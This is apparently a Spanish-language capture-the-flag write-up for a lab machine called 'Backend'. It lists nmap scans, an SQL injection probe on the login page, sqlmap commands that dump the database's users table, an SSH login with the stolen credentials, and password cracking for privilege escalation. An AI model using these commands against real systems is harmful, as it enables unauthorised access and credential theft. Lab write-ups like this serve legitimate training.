# Maquina Backend

### Puertos abiertos

sudo nmap -sS --min-rate 6000 -p- --open -vvv -Pn 172.17.0.1

![alt text](image.png)

### Servicios y versiones

sudo nmap -sVC --min-rate 6000 -p22,80 -vvv -Pn 172.17.0.1

![alt text](image-1.png)

### Entrando en la web

Entrando en http://172.17.0.1/login.html, encontramos un login que al hacer ' or 1=1 -- -, nos da un error lo que me hace pensar de que se puede tratar de un SQLi.

![alt text](image-2.png)


![alt text](image-3.png)

### SQLMAP

Ver bases de datos:

sqlmap -u "http://172.17.0.1/login.html" --forms --batch --dbs

![alt text](image-4.png)

Ver tablas de la base de datos users:

sqlmap -u "http://172.17.0.1/login.html" --forms --batch -D users --tables


![alt text](image-5.png)


Ver el contenido de la tabla usuarios:

sqlmap -u "http://172.17.0.1/login.html" --forms --batch -D users -T usuarios 

![alt text](image-6.png)

### Intrusión

Nos conectamos por ssh con el usuario pepe y su respectiva contraseña, también vemos todos los usuarios en el sistema:

![alt text](image-7.png)


### Escalar privilegios

![alt text](image-8.png)

crackeamos la contraseña con crackstation y listo





